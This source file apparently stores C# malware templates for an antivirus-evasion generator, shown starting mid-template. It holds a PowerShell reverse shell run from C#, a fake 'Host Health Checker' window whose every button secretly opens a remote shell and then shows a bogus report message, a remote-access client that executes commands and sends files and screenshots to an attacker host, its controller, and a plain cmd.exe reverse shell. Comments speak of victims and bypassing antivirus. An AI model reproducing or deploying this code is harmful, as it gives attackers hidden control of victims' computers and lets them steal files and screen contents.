	$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
	if ($pos -gt 0) {
	$string = $encoding.GetString($networkbuffer,0,$pos)
	$inputstream.write($string)
	start-sleep 1
	if ($process.ExitCode -ne $null) {cleanup}
	else {
	$out = $encoding.GetString($outputstream.Read())
	while($outputstream.Peek() -ne -1){
	$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
	$stream.Write($encoding.GetBytes($out),0,$out.length)
	$out = $null
	$string = $null}} else {cleanup}}";
				using (var powershell = PowerShell.Create()) 
				{
					powershell.AddScript(script, false);
	
					powershell.Invoke(); 
	
					powershell.Commands.Clear();
					
				}
			}
	
			static void Main(string[] args)
			{
				try
				{
					RunPS(); 
				}
				catch (Exception)
				{
					
				}
			}
		}
	}`

var AvBusterPSCsharpRevShellGUI = `using System;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Text;
using System.Management.Automation;


    public class psForm : System.Windows.Forms.Form
    {
        private System.Windows.Forms.Panel headerpanel;
        private System.Windows.Forms.Label missinglabel;
        private System.Windows.Forms.Button btnHealthCheck;
        private System.Windows.Forms.Button btnCPUUsage;
        private System.Windows.Forms.Button btnUpdateCheck;
        private System.Windows.Forms.Button button3;
        private System.Windows.Forms.Button button1;
        public psForm()
        {
            InitializeComponent();
        }
        
       public static void Main()
        {
            Application.EnableVisualStyles();
            Application.Run(new psForm());
        }
    
private static void RunPS()
        {
            string script = @"function cleanup {
if ($client.Connected -eq $true) {$client.Close()}
if ($process.ExitCode -ne $null) {$process.Close()}
exit}
$address = 'RHOST' 
$port = 'RPORT'
$client = New-Object system.net.sockets.tcpclient
$client.connect($address,$port)
$stream = $client.GetStream()
$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.StartInfo.WindowStyle = Hidden
$process.Start()
$inputstream = $process.StandardInput
$outputstream = $process.StandardOutput
Start-Sleep 1
$encoding = new-object System.Text.AsciiEncoding
while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
$stream.Write($encoding.GetBytes($out),0,$out.Length)
$out = $null; $done = $false; $testing = 0;
while (-not $done) {
if ($client.Connected -ne $true) {cleanup}
$pos = 0; $i = 1
while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
if ($pos -gt 0) {
$string = $encoding.GetString($networkbuffer,0,$pos)
$inputstream.write($string)
start-sleep 1
if ($process.ExitCode -ne $null) {cleanup}
else {
$out = $encoding.GetString($outputstream.Read())
while($outputstream.Peek() -ne -1){
$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
$stream.Write($encoding.GetBytes($out),0,$out.length)
$out = $null
$string = $null}} else {cleanup}}";
            using (var powershell = PowerShell.Create()) 
            {
                powershell.AddScript(script, false);

                powershell.Invoke(); 

                powershell.Commands.Clear();
                
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //createpsrevshell();
            this.Close();
        }

        private void btnUpdateCheck_Click(object sender, EventArgs e)
        {
           RunPS();
            System.Threading.Thread.Sleep(4000);
            MessageBox.Show("Report is ready to download at current folder", "Scan Result", MessageBoxButtons.OK);
        }

        private void button1_MouseEnter(object sender, EventArgs e)
        {
            (sender as Button).BackColor = Color.Red;

        }

        private void button1_MouseLeave(object sender, EventArgs e)
        {
            (sender as Button).BackColor = Color.Gray;

        }

        private void InitializeComponent()
        {
            this.headerpanel = new System.Windows.Forms.Panel();
            this.button1 = new System.Windows.Forms.Button();
            this.missinglabel = new System.Windows.Forms.Label();
            this.btnHealthCheck = new System.Windows.Forms.Button();
            this.btnCPUUsage = new System.Windows.Forms.Button();
            this.btnUpdateCheck = new System.Windows.Forms.Button();
            this.button3 = new System.Windows.Forms.Button();
            this.headerpanel.SuspendLayout();
            this.SuspendLayout();
            // 
            // headerpanel
            // 
            this.headerpanel.BackColor = System.Drawing.SystemColors.ActiveCaption;
            this.headerpanel.Controls.Add(this.button1);
            this.headerpanel.Controls.Add(this.missinglabel);
            this.headerpanel.Dock = System.Windows.Forms.DockStyle.Top;
            this.headerpanel.Font = new System.Drawing.Font("Century Gothic", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.headerpanel.Location = new System.Drawing.Point(0, 0);
            this.headerpanel.Margin = new System.Windows.Forms.Padding(4);
            this.headerpanel.Name = "headerpanel";
            this.headerpanel.Size = new System.Drawing.Size(460, 30);
            this.headerpanel.TabIndex = 0;
            // 
            // button1
            // 
            this.button1.BackColor = System.Drawing.SystemColors.ActiveBorder;
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button1.ForeColor = System.Drawing.SystemColors.ActiveCaptionText;
            this.button1.Location = new System.Drawing.Point(423, 1);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(36, 27);
            this.button1.TabIndex = 4;
            this.button1.Text = "X";
            this.button1.UseVisualStyleBackColor = false;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            this.button1.MouseEnter += new System.EventHandler(this.button1_MouseEnter);
            this.button1.MouseLeave += new System.EventHandler(this.button1_MouseLeave);
            // 
            // missinglabel
            // 
            this.missinglabel.AutoSize = true;
            this.missinglabel.Font = new System.Drawing.Font("Century Gothic", 8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.missinglabel.Location = new System.Drawing.Point(127, 9);
            this.missinglabel.Name = "missinglabel";
            this.missinglabel.Size = new System.Drawing.Size(193, 15);
            this.missinglabel.TabIndex = 0;
            this.missinglabel.Text = "Multi Purpose Host Health Checker";
            // 
            // btnHealthCheck
            // 
            this.btnHealthCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnHealthCheck.Location = new System.Drawing.Point(36, 133);
            this.btnHealthCheck.Name = "btnHealthCheck";
            this.btnHealthCheck.Size = new System.Drawing.Size(180, 56);
            this.btnHealthCheck.TabIndex = 2;
            this.btnHealthCheck.Text = "Health Check";
            this.btnHealthCheck.UseVisualStyleBackColor = true;
            this.btnHealthCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
            // 
            // btnCPUUsage
            // 
            this.btnCPUUsage.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnCPUUsage.Location = new System.Drawing.Point(241, 71);
            this.btnCPUUsage.Name = "btnCPUUsage";
            this.btnCPUUsage.Size = new System.Drawing.Size(180, 56);
            this.btnCPUUsage.TabIndex = 1;
            this.btnCPUUsage.Text = "CPU Usage";
            this.btnCPUUsage.UseVisualStyleBackColor = true;
            this.btnCPUUsage.Click += new System.EventHandler(this.btnUpdateCheck_Click);
            // 
            // btnUpdateCheck
            // 
            this.btnUpdateCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnUpdateCheck.Location = new System.Drawing.Point(36, 71);
            this.btnUpdateCheck.Name = "btnUpdateCheck";
            this.btnUpdateCheck.Size = new System.Drawing.Size(180, 56);
            this.btnUpdateCheck.TabIndex = 0;
            this.btnUpdateCheck.Text = "Check Updates";
            this.btnUpdateCheck.UseVisualStyleBackColor = true;
            this.btnUpdateCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
            // 
            // button3
            // 
            this.button3.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button3.Location = new System.Drawing.Point(241, 133);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(180, 56);
            this.button3.TabIndex = 3;
            this.button3.Text = "Hidden Files";
            this.button3.UseVisualStyleBackColor = true;
            this.button3.Click += new System.EventHandler(this.btnUpdateCheck_Click);
            // 
            // Form
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 17F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(460, 222);
            this.Controls.Add(this.button3);
            this.Controls.Add(this.btnUpdateCheck);
            this.Controls.Add(this.btnCPUUsage);
            this.Controls.Add(this.btnHealthCheck);
            this.Controls.Add(this.headerpanel);
            this.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Margin = new System.Windows.Forms.Padding(4);
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(460, 250);
            this.MinimizeBox = false;
            this.Name = "Form";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Health Checker";
            this.headerpanel.ResumeLayout(false);
            this.headerpanel.PerformLayout();
            this.ResumeLayout(false);

        }

	}`

var AvBusterCustomCSharpRevShellClient = `using System;
	using System.Diagnostics;
	using System.Drawing;
	using System.Drawing.Imaging;
	using System.Net;
	using System.Net.Sockets;
	using System.Text;
	using System.Threading;
	using System.Windows.Forms;
	
	namespace client
	{
		class Program
		{
			static void Main(string[] args)
			{
				try
				{
					StartClient(); 
	
				}
				catch (Exception)
				{
	
				}
			}
	
			static string getresult(string command) 
			{
				Process p = new Process();
				p.StartInfo.FileName = "cmd.exe";
				p.StartInfo.Arguments = "/c " + command;
				p.StartInfo.UseShellExecute = false;
				p.StartInfo.RedirectStandardOutput = true;
				p.Start();
	
				string output = p.StandardOutput.ReadToEnd();
				p.WaitForExit();
	
				return output;
			}
	
			private static string getscreen()
	
			{
				string fname = "myscreen.png";
				try
	
				{
					Bitmap captureBitmap = new Bitmap(1024, 768, PixelFormat.Format32bppArgb);
					Rectangle captureRectangle = Screen.PrimaryScreen.Bounds; // here we are taking only primary screen if you want to use in real time env loop through all screns and take screen shots
					//Creating a New Graphics Object
					Graphics captureGraphics = Graphics.FromImage(captureBitmap);
					//Copying Image from The Screen
					captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
					captureBitmap.Save(fname, ImageFormat.Png);
				}
	
				catch (Exception)
				{
				}
				return fname;
			}
			public static void StartClient()
			{
				IPAddress ipAddress = IPAddress.Parse("RHOST"); 
				IPEndPoint remoteEP = new IPEndPoint(ipAddress, RPORT);
				// Create a TCP/IP  socket.    
				Socket sender = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
				sender.Connect(remoteEP); // connect to ur remote server
	
				while (true) // start an infinite loop
				{
	
					try
					{
						string data = "";
						string result;
	
						var buffer = new byte[1024];
						int bytesRead;
						int lineposition = -1;
	
						do
						{
							lineposition = Array.IndexOf(buffer, (byte)'\n'); // checks for the position of new line
							//Console.WriteLine(lineposition);
							bytesRead = sender.Receive(buffer);
							data += Encoding.ASCII.GetString(buffer, 0, bytesRead);
	
						}
						while (lineposition >= 0); // this loop is for accepting command from the server . it reads till it find a new line in received buffer
						//Console.WriteLine("Text received : {0}", data);
	
					   
						if (data.ToLower().StartsWith("getfile")) // if the command starts with getfile 
						{
							string[] filename = data.Split(new char[] { ' ' });
							sender.SendFile(filename[1]); // sends the file to the controller 
							Thread.Sleep(700); // waits for some time before sendig the end of command indication to the server
							sender.Send(Encoding.ASCII.GetBytes("EOF")); // we are sending this to indicate the remote machine that all contents sent , time to save the file
						} else if (data.ToLower().StartsWith("bye"))
						{
							break; // for terminating the connection by breaking the loop 
						} else if (data.ToLower().StartsWith("grabscreen")) // if command is grabscreen take screen shot and send it to remote server
						{
						  string  sendscreen =  getscreen();
							sender.SendFile(sendscreen);
							Thread.Sleep(700);
							sender.Send(Encoding.ASCII.GetBytes("EOF")); // everything is like sending a file 
							System.IO.File.Delete(sendscreen); 
						}
						else
						{ // here is the core command execution , instead of sending the shell over tcp , we send only the command's result
							result = getresult(data);
							//Console.WriteLine(result);
							byte[] msg = Encoding.ASCII.GetBytes(result + "EOF");
						   // Console.WriteLine(msg.Length);
							sender.Send(msg);
							//sender.Shutdown(SocketShutdown.Both);
						}
	
					}
					catch (ArgumentNullException ane) // we throw all exceptions to the main function and supress it there since we dont need to indicate any error to the victim
						{
						throw ane;
						}
						catch (SocketException se)
						{
						throw se;
						}
						catch (Exception e)
						{
						throw e;
						}
	
				   
				}
			   sender.Shutdown(SocketShutdown.Both); // out side the loop , close connection
			   sender.Close();
			}
		}
	}
	`
var AvBusterCustomCSharpRevShellManager = `using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace sharpshells
{
    class Program
    {
        static void Main(string[] args)
        {
            StartServer();
        }

        public static void StartServer()
        {
           
            IPAddress ipAddress = IPAddress.Parse("RHOST"); // stars server in this ip 
            IPEndPoint localEndPoint = new IPEndPoint(ipAddress, RPORT); // this port
            try
            {

                // Create a Socket that will use Tcp protocol      
                Socket listener = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                // A Socket must be associated with an endpoint using the Bind method  
                listener.Bind(localEndPoint); // bind the socket to the end point
                // Specify how many requests a Socket can listen before it gives Server busy response.  
                // We will listen 10 requests at a time  
                listener.Listen(10); // listen for connections
                Socket handler;
                Console.WriteLine("Wait for your bot...");
                handler = listener.Accept(); // accept the connection from the victim
                string botip = handler.RemoteEndPoint.ToString(); // fetch the remote ip and port info from the handler socket
                while (true)
                {
                    Console.Write("[{0}] # : ",botip); // this is prompt u see when victim connects back to u

                    // Incoming data from the client.    
                    string val = null;

                    val = Console.ReadLine(); // waiting for ur command , reads a line (terminates with a new line)
                    if (val == "bye")
                    {
                        
                        break; // breaks from the loop and disconnects
                    }
                    if (val.StartsWith("getfile") ) // gets the file from victim and saves it 
                    {
                        byte[] msg = Encoding.ASCII.GetBytes(val);
                        int bytesSent = handler.Send(msg);
                        Console.WriteLine("Send file command {0}", val);
                        string[] getfilename = val.Split(new char[] { ' ' }); // actual command will be getfile filename // space is the delimiter
                        using (var output = File.Create(getfilename[1]))
                        {

                            // read the file in chunks of 1KB
                            var buffer = new byte[1024];
                            int bytesRead;
                            string clientmsg = "";
                            while ((bytesRead = handler.Receive(buffer,0,  buffer.Length, SocketFlags.None)) >= 0)
                            {
                                clientmsg = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                                if (clientmsg.IndexOf("EOF") > -1) // this eof is end from the victim hope u remember that when i went through the client
                                {
                                    break;
                                }
                                output.Write(buffer, 0, bytesRead);
                                

                            }
                        }
                        Console.WriteLine("Got and saved as {0}", getfilename[1]);
                    } else if (val.StartsWith("grabscreen")) // same operation like file above
                    {
                        byte[] msg = Encoding.ASCII.GetBytes(val);
                        int bytesSent = handler.Send(msg);
                        Console.WriteLine("Send file command {0}", val);
                        using (var output = File.Create("victimscreen.png"))
                        {

                            // read the file in chunks of 1KB
                            var buffer = new byte[1024];
                            int bytesRead;
                            string clientmsg = "";
                            while ((bytesRead = handler.Receive(buffer, 0, buffer.Length, SocketFlags.None)) >= 0)
                            {
                                clientmsg = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                                if (clientmsg.IndexOf("EOF") > -1)
                                {
                                    break;
                                }
                                output.Write(buffer, 0, bytesRead);


                            }
                        }
                        Console.WriteLine("Got and saved as victimscreen.png") ;
                    }
                    else
                    {
                        // Encode the data string into a byte array.    
                        byte[] msg = Encoding.ASCII.GetBytes(val);// + "EOFCMD"); // here val is the command we take from keyboard it has a newline character as builtin terminator that we check in client

                        // Send the data through the socket.    
                        int bytesSent = handler.Send(msg); // converted the string to byte array to send it over the socket
                        Console.WriteLine("send msg = {0}", Encoding.ASCII.GetString(msg));
                        // Receive the response from the remote device.   

                        var buffer = new byte[1024];
                        int bytesRead;
                        string clientmsg = "";

                        while ((bytesRead = handler.Receive(buffer, 0, buffer.Length, SocketFlags.None)) >=0) // receives the command result and saves it in a variable clientmsg
                        {
                            clientmsg += Encoding.ASCII.GetString(buffer, 0, bytesRead);
                            if (clientmsg.IndexOf("EOF") > -1)
                            {
                                break;
                            }

                        }
                        clientmsg = clientmsg.Replace("EOF", "");
                        Console.WriteLine(clientmsg);  // displays the command output for u
                       
                    }

                }
               handler.Shutdown(SocketShutdown.Both); // closes all connection 
               handler.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }

            Console.WriteLine("\n Bye for now...");
            Console.ReadKey(); // let me show u how it works , how can u bypass ur antivirus :) // build it in release mode recommended , here i am using debug mode binaries ,, it is for my test :)
        }
    }
}

`

var AvBusterSimpleRevShell = `using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;


namespace NormalTcp
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("RHOST", RPORT))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}`
